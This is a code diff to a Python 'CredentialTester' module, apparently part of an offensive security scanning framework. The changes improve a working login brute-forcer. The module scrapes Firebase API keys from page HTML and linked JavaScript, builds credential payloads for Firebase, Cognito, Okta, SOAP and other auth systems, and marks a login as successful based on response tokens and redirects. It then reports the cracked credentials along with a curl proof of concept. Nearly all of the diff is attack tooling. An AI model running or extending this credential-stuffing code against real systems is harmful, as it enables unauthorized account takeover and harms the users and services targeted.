@@ -9,8 +9,6 @@ import urllib.error
 import urllib.parse
 import base64
 import re
-import hashlib
-import hmac
 
 
 class CredentialTester(BaseModule):
@@ -53,9 +51,7 @@ class CredentialTester(BaseModule):
 
         print(f"\033[96m[*] Target URL: {target_url}\033[0m")
 
-        # Detect auth type from URL patterns
-        auth_type = self._detect_auth_type(target_url)
-        
+        # Check if direct Firebase URL provided
         if 'identitytoolkit.googleapis.com' in target_url:
             print(f"\033[92m[+] Using Firebase Identity Toolkit URL directly\033[0m")
             endpoint = {
@@ -63,26 +59,37 @@ class CredentialTester(BaseModule):
                 'auth_type': 'firebase',
                 'fields': {'username_fields': ['email'], 'password_field': 'password'}
             }
-        elif auth_type:
-            print(f"\033[92m[+] Detected auth type: {auth_type}\033[0m")
-            endpoint = {
-                'url': target_url,
-                'auth_type': auth_type,
-                'fields': {'username_fields': ['email', 'username'], 'password_field': 'password'}
-            }
         else:
-            print(f"\033[96m[*] Attempting to extract Firebase config...\033[0m")
-            firebase_url = await self._extract_firebase_endpoint(target_url)
+            # Check if it's a Firebase hosting URL that needs API key extraction
+            detected_type = self._detect_auth_type(target_url)
             
-            if firebase_url:
-                print(f"\033[92m[+] Firebase endpoint found: {firebase_url}\033[0m")
+            if detected_type == 'firebase':
+                print(f"\033[96m[*] Firebase hosting detected, extracting API key...\033[0m")
+                firebase_url = await self._extract_firebase_endpoint(target_url)
+                
+                if firebase_url:
+                    print(f"\033[92m[+] Firebase Identity Toolkit endpoint: {firebase_url}\033[0m")
+                    endpoint = {
+                        'url': firebase_url,
+                        'auth_type': 'firebase',
+                        'fields': {'username_fields': ['email'], 'password_field': 'password'}
+                    }
+                else:
+                    print(f"\033[93m[!] Could not extract Firebase API key, trying universal brute force on HTML page\033[0m")
+                    endpoint = {
+                        'url': target_url,
+                        'auth_type': 'universal',
+                        'fields': {'username_fields': ['email', 'username'], 'password_field': 'password'}
+                    }
+            elif detected_type:
+                print(f"\033[92m[+] Detected auth type: {detected_type}\033[0m")
                 endpoint = {
-                    'url': firebase_url,
-                    'auth_type': 'firebase',
-                    'fields': {'username_fields': ['email'], 'password_field': 'password'}
+                    'url': target_url,
+                    'auth_type': detected_type,
+                    'fields': {'username_fields': ['email', 'username'], 'password_field': 'password'}
                 }
             else:
-                print(f"\033[93m[!] No specific auth type detected, trying universal brute force\033[0m")
+                print(f"\033[93m[!] No specific auth type detected, using universal brute force\033[0m")
                 endpoint = {
                     'url': target_url,
                     'auth_type': 'universal',
@@ -101,14 +108,15 @@ class CredentialTester(BaseModule):
         """Detect authentication type from URL patterns"""
         url_lower = url.lower()
         
+        # Firebase patterns (web.app, firebaseapp.com, etc.)
+        if any(kw in url_lower for kw in ['web.app', 'firebaseapp.com', 'firebase', 'identitytoolkit']):
+            return 'firebase'
+        
         patterns = {
-            'firebase': ['identitytoolkit', 'firebaseapp', 'web.app'],
             'aws_cognito': ['cognito', 'amazoncognito', 'aws.amazon.com'],
             'auth0': ['auth0.com', 'auth0'],
             'okta': ['okta.com', 'oktapreview', 'okta-emea'],
             'keycloak': ['keycloak', 'auth/realms'],
-            'ldap': ['ldap', 'ldaps', '389', '636'],
-            'saml': ['saml', 'saml2', 'adfs', 'shibboleth'],
             'jwt': ['/jwt', '/token', 'api/token', 'auth/token'],
             'oauth2': ['/oauth', '/oauth2', 'authorize', 'access_token'],
             'graphql': ['/graphql', '/gql', 'api/graphql'],
@@ -123,6 +131,8 @@ class CredentialTester(BaseModule):
             'exchange': ['/owa', 'exchange', 'outlook'],
             'citrix': ['/citrix', 'nfauth'],
             'vmware': ['/ui', 'vmware', 'vsphere'],
+            'basic_auth': ['basic', 'auth'],
+            'xml_soap': ['/soap', '/ws/', '/wsdl', '/service'],
         }
         
         for auth_type, keywords in patterns.items():
@@ -132,6 +142,7 @@ class CredentialTester(BaseModule):
         return None
 
     async def _extract_firebase_endpoint(self, url: str) -> Optional[str]:
+        """Extract Firebase API key from page and construct Identity Toolkit endpoint"""
         try:
             req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
             with urllib.request.urlopen(req, timeout=15) as response:
@@ -139,47 +150,57 @@ class CredentialTester(BaseModule):
             
             api_key = None
             
+            # Look for apiKey in various formats
             patterns = [
                 r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_-]{39})',
                 r'apiKey:\s*["\']([A-Za-z0-9_-]{39})["\']',
                 r'"apiKey":\s*"([A-Za-z0-9_-]{39})"',
                 r'apiKey\s*=\s*["\']([A-Za-z0-9_-]{39})["\']',
-                r'AIza[0-9A-Za-z_-]{35}',
+                r'AIza[0-9A-Za-z_-]{35}',  # Direct API key pattern (39 chars starting with AIza)
             ]
             
             for pattern in patterns:
                 match = re.search(pattern, html)
                 if match:
                     api_key = match.group(1) if match.groups() else match.group(0)
-                    print(f"\033[92m[+] Found API key in page source\033[0m")
+                    # Clean up the key if needed
+                    api_key = api_key.strip().strip('"\'')
+                    print(f"\033[92m[+] Found Firebase API key in page source\033[0m")
                     break
             
+            # If not found in HTML, check linked JS files
             if not api_key:
                 js_files = re.findall(r'src=["\']([^"\']+\.js)["\']', html)
-                print(f"\033[96m[*] Scanning {len(js_files)} JS files for API key...\033[0m")
-                
-                for js_path in js_files[:10]:
-                    try:
-                        js_url = js_path if js_path.startswith('http') else urllib.parse.urljoin(url, js_path)
-                        js_req = urllib.request.Request(js_url, headers={'User-Agent': 'Mozilla/5.0'})
-                        with urllib.request.urlopen(js_req, timeout=10) as js_response:
-                            js_content = js_response.read().decode('utf-8', errors='ignore')
-                        
-                        for pattern in patterns:
-                            match = re.search(pattern, js_content)
-                            if match:
-                                api_key = match.group(1) if match.groups() else match.group(0)
-                                print(f"\033[92m[+] Found API key in {js_path}\033[0m")
+                if js_files:
+                    print(f"\033[96m[*] Scanning {len(js_files)} JS file(s) for API key...\033[0m")
+                    
+                    for js_path in js_files[:10]:
+                        try:
+                            js_url = js_path if js_path.startswith('http') else urllib.parse.urljoin(url, js_path)
+                            js_req = urllib.request.Request(js_url, headers={'User-Agent': 'Mozilla/5.0'})
+                            with urllib.request.urlopen(js_req, timeout=10) as js_response:
+                                js_content = js_response.read().decode('utf-8', errors='ignore')
+                            
+                            for pattern in patterns:
+                                match = re.search(pattern, js_content)
+                                if match:
+                                    api_key = match.group(1) if match.groups() else match.group(0)
+                                    api_key = api_key.strip().strip('"\'')
+                                    print(f"\033[92m[+] Found API key in {js_path}\033[0m")
+                                    break
+                            
+                            if api_key:
                                 break
-                        
-                        if api_key:
-                            break
-                    except Exception:
-                        continue
+                        except Exception:
+                            continue
             
             if api_key:
-                firebase_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={api_key}"
-                return firebase_url
+                # Validate API key format (should be 39 chars starting with AIza)
+                if len(api_key) >= 35 and api_key.startswith('AIza'):
+                    firebase_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={api_key}"
+                    return firebase_url
+                else:
+                    print(f"\033[93m[!] Invalid API key format found: {api_key[:10]}...\033[0m")
             
             return None
             
@@ -329,24 +350,6 @@ class CredentialTester(BaseModule):
             }
             result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
 
-        # LDAP (via HTTP proxy/gateway)
-        elif auth_type == 'ldap':
-            result['data'] = {
-                'username': username,
-                'password': password,
-                'auth_type': 'ldap'
-            }
-            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
-
-        # SAML (simplified)
-        elif auth_type == 'saml':
-            result['data'] = {
-                'username': username,
-                'password': password,
-                'SAMLRequest': 'placeholder'
-            }
-            result['headers']['Content-Type'] = 'application/x-www-form-urlencoded'
-
         # JWT / Token endpoint
         elif auth_type == 'jwt':
             result['data'] = {
@@ -483,12 +486,6 @@ class CredentialTester(BaseModule):
             result['basic_auth_tuple'] = (username, password)
             result['method'] = 'GET'
 
-        # Digest Auth
-        elif auth_type == 'digest_auth':
-            result['use_basic_auth'] = True  # urllib handles both
-            result['basic_auth_tuple'] = (username, password)
-            result['method'] = 'GET'
-
         # XML/SOAP
         elif auth_type == 'xml_soap':
             result['data'] = f'''<?xml version="1.0" encoding="utf-8"?>
@@ -503,9 +500,8 @@ class CredentialTester(BaseModule):
             result['headers']['Content-Type'] = 'text/xml; charset=utf-8'
             result['headers']['SOAPAction'] = '"Login"'
 
-        # Default / Universal
+        # Universal / Default - try common formats
         else:
-            # Try multiple common formats
             result['data'] = {
                 'email': username,
                 'password': password
@@ -517,7 +513,6 @@ class CredentialTester(BaseModule):
 
     def _extract_cognito_client_id(self, url: str) -> str:
         """Extract AWS Cognito Client ID from URL or return placeholder"""
-        # Try to extract from URL pattern
         match = re.search(r'client_id=([a-z0-9]+)', url, re.IGNORECASE)
         if match:
             return match.group(1)
@@ -540,6 +535,7 @@ class CredentialTester(BaseModule):
         counter = [0]
 
         print(f"\033[96m[*] Auth Type : {auth_type}\033[0m")
+        print(f"\033[96m[*] Target    : {url}\033[0m")
         print(f"\033[96m[*] Usernames : {len(all_usernames)}\033[0m")
         print(f"\033[96m[*] Passwords : {len(passwords)}\033[0m")
         print(f"\033[96m[*] Total     : {total_attempts}\033[0m\n")
@@ -554,12 +550,10 @@ class CredentialTester(BaseModule):
                     loop = asyncio.get_event_loop()
 
                     def do_request():
-                        # Build payload for this auth type
                         config = self._build_payload(auth_type, username, password, url)
                         
                         try:
                             if config.get('use_basic_auth'):
-                                # Basic/Digest Auth
                                 auth_str = base64.b64encode(
                                     f"{config['basic_auth_tuple'][0]}:{config['basic_auth_tuple'][1]}".encode()
                                 ).decode()
@@ -575,7 +569,6 @@ class CredentialTester(BaseModule):
                                     return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), auth_type
                             
                             else:
-                                # POST requests
                                 data = config['data']
                                 if config.get('use_json'):
                                     body = json.dumps(data).encode('utf-8')
@@ -614,13 +607,18 @@ class CredentialTester(BaseModule):
 
                     is_success = False
 
-                    # Auth-specific success detection
+                    # Firebase success detection
                     if auth_type == 'firebase':
                         if 'idtoken' in tl or 'id_token' in tl:
                             if not any(err in tl for err in ['invalid', 'error', 'failed']):
                                 is_success = True
                         elif 'registered' in tl and 'true' in tl:
                             is_success = True
+                        # Also check for error indicating wrong password vs invalid user
+                        elif 'INVALID_PASSWORD' in text:
+                            pass  # Wrong password, but user exists
+                        elif 'EMAIL_NOT_FOUND' in text:
+                            pass  # User doesn't exist
                     
                     elif auth_type == 'aws_cognito':
                         if 'accessToken' in tl or 'idToken' in tl or 'AuthenticationResult' in tl:
@@ -631,7 +629,7 @@ class CredentialTester(BaseModule):
                             is_success = True
                     
                     elif auth_type == 'okta':
-                        if 'sessionToken' in tl or 'status' in tl and 'success' in tl:
+                        if 'sessionToken' in tl or ('status' in tl and 'success' in tl):
                             is_success = True
                     
                     elif auth_type == 'jwt' or auth_type == 'oauth2':
@@ -650,15 +648,16 @@ class CredentialTester(BaseModule):
                             is_success = True
                     
                     # Universal success indicators
-                    elif any(k in tl for k in ['token', 'access_token', 'session', 'authenticated', 'success', 'welcome', 'dashboard']):
-                        if not any(err in tl for err in ['invalid', 'error', 'failed', 'wrong', 'denied', 'unauthorized']):
-                            is_success = True
-                    
-                    # Redirect to non-login page
-                    if status in [301, 302, 303]:
-                        location = resp_headers.get('Location', '').lower()
-                        if location and not any(p in location for p in ['login', 'signin', 'error', 'fail', 'denied', 'auth']):
-                            is_success = True
+                    if not is_success:
+                        if any(k in tl for k in ['token', 'access_token', 'session', 'authenticated', 'success', 'welcome', 'dashboard']):
+                            if not any(err in tl for err in ['invalid', 'error', 'failed', 'wrong', 'denied', 'unauthorized']):
+                                is_success = True
+                        
+                        # Redirect to non-login page
+                        if status in [301, 302, 303]:
+                            location = resp_headers.get('Location', '').lower()
+                            if location and not any(p in location for p in ['login', 'signin', 'error', 'fail', 'denied', 'auth']):
+                                is_success = True
 
                     if is_success:
                         sys.stdout.write('\n')
@@ -702,7 +701,7 @@ class CredentialTester(BaseModule):
             severity='Critical',
             description=f'Successfully brute-forced login at {url}\nUsername: {username}\nPassword: {password}\nAttempts: {attempts}',
             evidence={'username': username, 'password': password, 'url': url, 'attempts': attempts},
-            poc=f"curl -X POST '{url}' -d 'username={username}&password={password}'",
+            poc=f"curl -X POST '{url}' -d 'email={username}&password={password}'",
             remediation='Implement strong password policy, rate limiting, and account lockout',
             cvss_score=9.8, bounty_score=5000, target=url))
 
